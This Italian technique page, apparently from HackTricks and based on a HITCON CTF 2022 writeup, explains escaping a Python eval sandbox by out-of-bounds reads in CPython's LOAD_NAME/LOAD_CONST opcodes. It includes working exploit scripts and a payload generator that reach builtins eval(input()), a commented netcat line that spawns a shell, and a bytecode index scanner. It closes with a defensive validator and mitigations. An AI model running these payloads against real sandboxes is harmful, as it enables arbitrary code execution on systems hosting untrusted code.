# OOB Read dell'opcode LOAD_NAME / LOAD_CONST

{{#include ../../../banners/hacktricks-training.md}}

**Queste informazioni sono state prese** [**da questo writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Possiamo usare la funzionalità OOB read nell'opcode LOAD_NAME / LOAD_CONST per ottenere alcuni simboli dalla memoria. Questo significa usare un trick come `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` per ottenere un simbolo (come il nome di una funzione) desiderato.

Poi è sufficiente creare il proprio exploit.

### Panoramica <a href="#overview-1" id="overview-1"></a>

Il codice sorgente è piuttosto breve e contiene solo 4 righe!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Puoi inserire codice Python arbitrario, che verrà compilato in un [Python code object](https://docs.python.org/3/c-api/code.html). Tuttavia, `co_consts` e `co_names` di tale code object verranno sostituiti con una tupla vuota prima di eseguire quel code object con `eval`.

In questo modo, tutte le espressioni che contengono consts (ad esempio numeri, stringhe, ecc.) o names (ad esempio variabili, funzioni) potrebbero alla fine causare un segmentation fault.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Come si verifica il segmentation fault?

Iniziamo con un esempio semplice: `[a, b, c]` potrebbe essere compilato nel seguente bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ma cosa succede se `co_names` diventa una tupla vuota? L'opcode `LOAD_NAME 2` viene comunque eseguito e tenta di leggere il valore dall'indirizzo di memoria in cui originariamente dovrebbe trovarsi. Sì, questa è una "feature" di out-of-bound read.

Il concetto di base della soluzione è semplice. Alcuni opcode in CPython, ad esempio `LOAD_NAME` e `LOAD_CONST`, sono vulnerabili (?) a OOB read.

Recuperano un oggetto dall'indice `oparg` della tupla `consts` o `names` (che internamente corrispondono a `co_consts` e `co_names`). Possiamo fare riferimento al seguente breve snippet su `LOAD_CONST` per vedere cosa fa CPython quando elabora l'opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
In questo modo possiamo usare la funzionalità OOB per ottenere un "name" da un offset di memoria arbitrario. Per essere sicuri di quale name si tratti e quale sia il suo offset, continuate semplicemente a provare `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... E potreste trovare qualcosa con oparg > 700. Naturalmente potete anche provare a usare gdb per dare un'occhiata al layout della memoria, ma non credo che sarebbe più facile?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Una volta recuperati quegli offset utili per i name / const, come _facciamo_ a ottenere un name / const da quell'offset e a usarlo? Ecco un trucco:\
Supponiamo di poter ottenere un name `__getattribute__` dall'offset 5 (`LOAD_NAME 5`) con `co_names=()`, quindi è sufficiente fare quanto segue:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Nota che non è necessario chiamarlo `__getattribute__`; puoi chiamarlo con un nome più breve o più strano.

Puoi capire il motivo semplicemente visualizzandone il bytecode:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Nota che `LOAD_ATTR` recupera anch'esso il nome da `co_names`. Python carica i nomi dallo stesso offset se il nome è lo stesso, quindi il secondo `__getattribute__` viene ancora caricato da offset=5. Utilizzando questa funzionalità, possiamo usare un nome arbitrario una volta che il nome si trova nella memoria vicina.

La generazione dei numeri dovrebbe essere banale:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Non ho usato `consts` a causa del limite di lunghezza.

Per prima cosa, ecco uno script che ci permette di trovare gli offset dei nomi.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Quanto segue serve a generare il vero exploit Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
In pratica esegue le seguenti operazioni; per quelle stringhe, le otteniamo dal metodo `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Note sulla versione e opcode interessati (Python 3.11–3.13)

- Gli opcode del bytecode CPython continuano a indicizzare le tuple `co_consts` e `co_names` tramite operandi interi. Se un attacker riesce a fare in modo che queste tuple siano vuote (o più piccole dell'indice massimo utilizzato dal bytecode), l'interprete leggerà memoria fuori dai limiti per quell'indice, ottenendo un puntatore PyObject arbitrario dalla memoria adiacente. Gli opcode rilevanti includono almeno:
- `LOAD_CONST consti` → legge `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → leggono i nomi da `co_names[...]` (per la versione 3.11+ si noti che `LOAD_ATTR`/`LOAD_GLOBAL` memorizzano i bit dei flag nel bit meno significativo; l'indice effettivo è `namei >> 1`). Consultare la documentazione del disassembler per la semantica esatta di ciascuna versione. [Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+ ha introdotto cache adaptive/inline che aggiungono voci `CACHE` nascoste tra le istruzioni. Questo non modifica la primitive OOB; significa solo che, se si crea manualmente il bytecode, è necessario tenere conto di tali voci di cache durante la costruzione di `co_code`.

Implicazione pratica: la tecnica descritta in questa pagina continua a funzionare su CPython 3.11, 3.12 e 3.13 quando è possibile controllare un code object (ad esempio tramite `CodeType.replace(...)`) e ridurre `co_consts`/`co_names`.

### Scanner rapido per gli indici OOB utili (compatibile con 3.11+/3.12+)

Se si preferisce cercare direttamente oggetti interessanti dal bytecode anziché dal codice sorgente di alto livello, è possibile generare code object minimi e provare gli indici con un brute force. L'helper seguente inserisce automaticamente le inline cache quando necessario.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Note
- Per sondare i nomi invece, sostituisci `LOAD_CONST` con `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` e adatta di conseguenza l'uso dello stack.
- Usa `EXTENDED_ARG` o più byte di `arg` per raggiungere, se necessario, indici >255. Quando crei il bytecode con `dis` come sopra, controlli solo il byte meno significativo; per indici più grandi, costruisci autonomamente i byte grezzi oppure suddividi l'attacco su più caricamenti.

### Pattern RCE minimo basato esclusivamente sul bytecode (co_consts OOB → builtins → eval/input)

Dopo aver identificato un indice di `co_consts` che restituisce il modulo builtins, puoi ricostruire `eval(input())` senza alcun `co_names` manipolando lo stack:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Questo approccio è utile nelle challenge che ti danno il controllo diretto su `co_code` obbligandoti al contempo a usare `co_consts=()` e `co_names=()` (ad esempio, “awpcode” di BCTF 2024). Evita i trick a livello di sorgente e mantiene ridotte le dimensioni del payload sfruttando le operazioni sullo stack del bytecode e i tuple builder.

### Controlli difensivi e mitigazioni per i sandbox

Se stai scrivendo un “sandbox” Python che compila o valuta codice non attendibile oppure manipola code object, non fare affidamento su CPython per verificare i limiti degli indici delle tuple usati dal bytecode. Valida invece autonomamente i code object prima di eseguirli.

Validatore pratico (rifiuta gli accessi OOB a co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Idee aggiuntive per la mitigazione
- Non consentire `CodeType.replace(...)` arbitrari su input non attendibili, oppure aggiungere controlli strutturali rigorosi sull'oggetto code risultante.
- Valutare l'esecuzione del codice non attendibile in un processo separato con sandboxing a livello del sistema operativo (seccomp, job objects, containers), invece di fare affidamento sulle semantiche di CPython.

## Riferimenti

- [1] [writeup di Splitline sul HITCON CTF 2022 "V O I D" (origine di questa tecnica e della catena di exploit ad alto livello)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Documentazione del disassembler Python (semantica degli indici per LOAD_CONST/LOAD_NAME/ecc. e flag del bit meno significativo di `LOAD_ATTR`/`LOAD_GLOBAL` in 3.11+)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
